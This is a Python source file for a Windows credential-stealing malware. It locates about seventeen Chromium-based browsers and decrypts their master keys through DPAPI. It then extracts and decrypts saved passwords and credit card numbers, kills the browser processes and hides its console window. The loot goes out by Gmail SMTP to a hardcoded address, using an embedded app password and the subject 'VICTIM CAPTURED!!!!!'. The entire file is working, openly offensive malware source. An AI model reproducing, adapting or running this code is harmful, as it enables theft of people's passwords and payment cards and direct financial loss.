import asyncio
import ctypes
import io
import json
import os
import re
import smtplib
import sqlite3
import sys
import threading
from base64 import b64decode
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart

import psutil
from cryptography.exceptions import InvalidTag
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from win32crypt import CryptUnprotectData

APPDATA = os.getenv("localappdata")
BROWSERS = {
    "amigo": APPDATA + "\\Amigo\\User Data",
    "torch": APPDATA + "\\Torch\\User Data",
    "kometa": APPDATA + "\\Kometa\\User Data",
    "orbitum": APPDATA + "\\Orbitum\\User Data",
    "cent-browser": APPDATA + "\\CentBrowser\\User Data",
    "7star": APPDATA + "\\7Star\\7Star\\User Data",
    "sputnik": APPDATA + "\\Sputnik\\Sputnik\\User Data",
    "vivaldi": APPDATA + "\\Vivaldi\\User Data",
    "google-chrome-sxs": APPDATA + "\\Google\\Chrome SxS\\User Data",
    "google-chrome": APPDATA + "\\Google\\Chrome\\User Data",
    "epic-privacy-browser": APPDATA + "\\Epic Privacy Browser\\User Data",
    "microsoft-edge": APPDATA + "\\Microsoft\\Edge\\User Data",
    "uran": APPDATA + "\\uCozMedia\\Uran\\User Data",
    "yandex": APPDATA + "\\Yandex\\YandexBrowser\\User Data",
    "brave": APPDATA + "\\BraveSoftware\\Brave-Browser\\User Data",
    "iridium": APPDATA + "\\Iridium\\User Data",
    "edge": APPDATA + "\\Microsoft\\Edge\\User Data",
}

IO_FILE_TO_STORE = io.BytesIO()
IO_FILE_LOCK = threading.Lock()


def w1nd0_dcr(encrypted_str: bytes) -> bytes:
    return CryptUnprotectData(encrypted_str, None, None, None, 0)[1]


def gtmk3y(path: [str, os.PathLike]) -> [bytes, None]:
    with open(path, "r", encoding="utf-8") as f:
        c = f.read()

    local_state = json.loads(c)

    try:
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        return w1nd0_dcr(master_key[5:])

    except KeyError:
        return None


def dcrpt_val(buff, master_key) -> str:
    try:
        iv = buff[3:15]
        payload = buff[15:]

        aesgcm = AESGCM(master_key)

        ciphertext = payload[:-16]
        auth_tag = payload[-16:]

        full_payload = ciphertext + auth_tag

        decrypted_pass = aesgcm.decrypt(iv, full_payload, None)

        decrypted_pass = decrypted_pass.decode()

        return decrypted_pass

    except InvalidTag:
        return f'Failed to decrypt "{str(buff)}" | key: "{str(master_key)}" | Error: MAC verification failed'
    except Exception as e:
        return f'Failed to decrypt "{str(buff)}" | key: "{str(master_key)}" | Error: {e}'


def steal_credit_cards(
    path: str,
    profile: str,
    master_key: bytes,
    file: io.BytesIO,
    browser_name: str,
):
    path = os.path.join(path, profile, "Web Data")

    conn = sqlite3.connect(path, timeout=1)
    conn.text_factory = lambda b: b.decode(errors="ignore")
    cursor = conn.cursor()

    for res in cursor.execute(
        "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
    ).fetchall():
        (
            name_on_card,
            expiration_month,
            expiration_year,
            card_number_encrypted,
        ) = res
        if name_on_card and card_number_encrypted:
            with IO_FILE_LOCK:
                file.seek(0)
                if (
                    f"""
                       CREDIT CARD FROM {browser_name}
=============================================================================
    Card Number: {dcrpt_val(card_number_encrypted, master_key)}
        Name: {name_on_card}
        Expiration Month: {expiration_month}
        Expiration Year: {expiration_year}

#############################################################################



""".encode()
                    not in file.read()
                ):
                    file.seek(0, 2)
                    file.write(
                        f"""
                       CREDIT CARD FROM {browser_name}
=============================================================================
    Card Number: {dcrpt_val(card_number_encrypted, master_key)}
        Name: {name_on_card}
        Expiration Month: {expiration_month}
        Expiration Year: {expiration_year}

#############################################################################



""".encode()
                    )

    cursor.close()
    conn.close()


def steal_passwords_for_all_browsers(
    path: str,
    profile: str,
    master_key: bytes,
    file: io.BytesIO,
    browser_name: str,
):
    path = os.path.join(path, profile, "Login Data")
    if not os.path.exists(path):
        return

    conn = sqlite3.connect(path, timeout=1)
    conn.text_factory = lambda b: b.decode(errors="ignore")
    cursor = conn.cursor()

    for res in cursor.execute(
        f"SELECT {'origin_url' if 'chrome' not in path.lower() else 'action_url'}, username_value, password_value FROM logins"
    ).fetchall():

        url, username, password = res
        password = dcrpt_val(password, master_key)

        if url and (username or password):
            with IO_FILE_LOCK:
                file.seek(0)
                if (
                    f"""
                        PASSWORD FROM {browser_name}
=============================================================================
    URL: {url}
        ID: {username}
        PASSW0RD: {password}

#############################################################################  


""".encode()
                    not in file.read()
                ):
                    file.seek(0, 2)
                    file.write(
                        f"""
                        PASSWORD FROM {browser_name}
=============================================================================
    URL: {url}
        ID: {username}
        PASSW0RD: {password}

#############################################################################  



""".encode()
                    )

    cursor.close()
    conn.close()


def find_profiles(browser_path):
    profiles = []
    for profile in os.listdir(browser_path):
        if os.path.isdir(os.path.join(browser_path, profile)) and re.match(
            r"^Profile \d+|Default", profile
        ):
            profiles.append(profile)
    return profiles


def get_credit_card(name, path):
    master_key = gtmk3y(os.path.join(path, "Local State"))

    profiles = find_profiles(path)
    for profile in profiles:
        try:
            steal_credit_cards(
                path, profile, master_key, IO_FILE_TO_STORE, name
            )
        except Exception as e:
            print(f"Exception: {e}, Browser: {name}")


def get_password(name, path):
    master_key = gtmk3y(os.path.join(path, "Local State"))

    profiles = find_profiles(path)
    for profile in profiles:
        try:
            steal_passwords_for_all_browsers(
                path, profile, master_key, IO_FILE_TO_STORE, name
            )

        except Exception as e:
            print(f"Exception: {e}, Browser: {name}")


def kill_browser(browser_name: str):
    # Go through all running processes
    for process in psutil.process_iter(["name"]):
        try:
            # Check if the process name matches the browser name
            if browser_name.lower() in process.info["name"].lower():
                # Terminate the process
                process.terminate()
        except (
            psutil.NoSuchProcess,
            psutil.AccessDenied,
            psutil.ZombieProcess,
        ):
            pass


def send_to_email(email, password, text):
    try:
        # Create the message
        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = email
        msg['Subject'] = "VICTIM CAPTURED!!!!!"

        # Attach the text as a .txt file
        txt_file = MIMEBase('application', 'octet-stream')
        txt_buffer = io.StringIO(text)
        txt_buffer.seek(0)
        txt_file.set_payload(txt_buffer.read())
        txt_buffer.close()

        encoders.encode_base64(txt_file)
        txt_file.add_header('Content-Disposition', 'attachment', filename='message.txt')
        msg.attach(txt_file)

        # Server setup
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()

        # Login
        server.login(email, password)

        # Sending email
        server.send_message(msg)

        # Terminate the SMTP session
        server.quit()

        print("Email sent successfully!")

    except Exception as e:
        print(f"Failed to send email: {e}")


async def main():
    tasks = []

    for name, path in BROWSERS.items():
        if not os.path.exists(path) or not os.path.isdir(path):
            continue

        kill_browser(name)

        tasks.append(
            asyncio.create_task(asyncio.to_thread(get_password, name, path))
        )

        tasks.append(
            asyncio.create_task(asyncio.to_thread(get_credit_card, name, path))
        )

    await asyncio.gather(*tasks)
    IO_FILE_TO_STORE.seek(0)

    send_to_email('zahir.junk12@gmail.com', 'pplq bmbj pspk flfi', IO_FILE_TO_STORE.read().decode())

def is_frozen():
    return getattr(sys, 'frozen', False)

if __name__ == "__main__":
    if is_frozen():
        window_handle = ctypes.windll.kernel32.GetConsoleWindow()
        if window_handle:
            ctypes.windll.user32.ShowWindow(window_handle, 0)

asyncio.run(main())